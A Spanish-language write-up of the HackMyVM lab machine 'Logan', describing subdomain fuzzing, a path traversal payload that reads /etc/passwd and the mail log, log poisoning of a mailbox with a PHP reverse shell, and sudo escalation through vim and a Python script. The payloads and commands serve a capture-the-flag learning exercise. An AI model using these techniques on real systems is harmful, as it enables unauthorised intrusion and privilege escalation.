---
Estado: Completado
Plataforma: HackMyVM
SO: Linux
Dificultad: Fácil
VectorInicial: Subdominio + path traversal + log poisoning
Privesc: Sudo vim -> usuario logan -> script Python como root
Fecha: 2026-02-05
---

# Logan

## Reconocimiento inicial

Lo primero es localizar la IP objetivo dentro de la red.

```bash
sudo arp-scan -I eth1 --localnet
```

A partir de la salida, se identifica `10.0.11.10` como host probable de la máquina.

Para no repetir la IP en cada comando, se guarda en la variable `TARGET`:

```bash
settarget 10.0.11.10
```

A continuación se enumeran puertos y servicios:

```bash
gomap -s $TARGET
```

Resultado relevante:

- `25` → servicio de correo Postfix
- `80` → servicio web Apache

Además, durante la enumeración aparece una referencia al dominio `logan.hmv`.

## Ajuste de resolución local

Se añade el dominio al fichero `/etc/hosts`:

```txt
10.0.11.10 logan.hmv
```

Una vez hecho esto, la web responde correctamente al navegar a `http://logan.hmv`.

## Enumeración web

La página principal no muestra nada especialmente útil. Se revisan tecnologías con `whatweb`:

```bash
whatweb http://logan.hmv
```

Y después se intenta enumeración de directorios:

```bash
gobuster dir -u http://logan.hmv/ -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
```

Sin resultados relevantes en directorios, se pasa a descubrir subdominios:

```bash
wfuzz -c --hc=404 --hl=1 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -H "Host: FUZZ.logan.hmv" -u $TARGET
```

Esto revela el subdominio `admin.logan.hmv`, que también se añade a `/etc/hosts`.

## Panel admin y lectura de ficheros

El panel descubierto sugiere funciones de carga o gestión, pero tras varias pruebas el comportamiento real apunta a una vulnerabilidad de lectura de archivos mediante path traversal.

Payload usado para leer `/etc/passwd`:

```txt
....//....//....//....//....//etc/passwd
```

Con esto se confirma la capacidad de leer ficheros arbitrarios.

## Log poisoning a través del correo

Dado que el puerto `25` está abierto, se consulta el log del correo:

```txt
....//....//....//....//....//var/log/mail.log
```

Al ver que el servicio registra correos, se plantea un log poisoning enviando un mensaje que incluya una reverse shell en PHP.

Se envía el correo vía `telnet` desde `logan@logan.hmv` hacia `www-data@logan.hmv`, insertando el payload PHP en el cuerpo del mensaje.

Después se accede al buzón mediante path traversal:

```txt
....//....//....//....//....//var/mail/www-data
```

Y se recibe la reverse shell en el listener preparado previamente con `penelope`.

## Acceso inicial

Ya dentro como `www-data`, se comprueban permisos:

```bash
sudo -l
```

Salida relevante:

```text
User www-data may run the following commands on logan:
    (logan) NOPASSWD: /usr/bin/vim
```

Escalada a `logan` mediante GTFOBins:

```bash
sudo -u logan vim -c ':!/bin/bash'
```

## Escalada final a root

Una vez como `logan`, se revisan de nuevo permisos sudo:

```bash
sudo -l
```

Salida:

```text
User logan may run the following commands on logan:
    (root) NOPASSWD: /usr/bin/python3 /opt/learn_some_python.py
```

Al ejecutar el script, se obtiene capacidad de ejecución como `root`.

```bash
sudo /usr/bin/python3 /opt/learn_some_python.py
```

A partir de ahí, se inyecta una shell con Python y se accede como `root`.

## Conclusión

La cadena de ataque queda así:

1. Descubrimiento de subdominio.
2. Path traversal para lectura arbitraria.
3. Log poisoning mediante correo.
4. Reverse shell como `www-data`.
5. Escalada a `logan` vía `vim` con `sudo`.
6. Escalada final a `root` mediante script Python permitido.

Laboratorio muy entretenido porque obliga a hilar varias fases en lugar de depender de un único fallo evidente.

---
Si te gustó, puedes invitarme a un café.
[![ko-fi](https://ko-fi.com/img/githubbutton_sm.svg)](https://ko-fi.com/C0C61UHTB1)

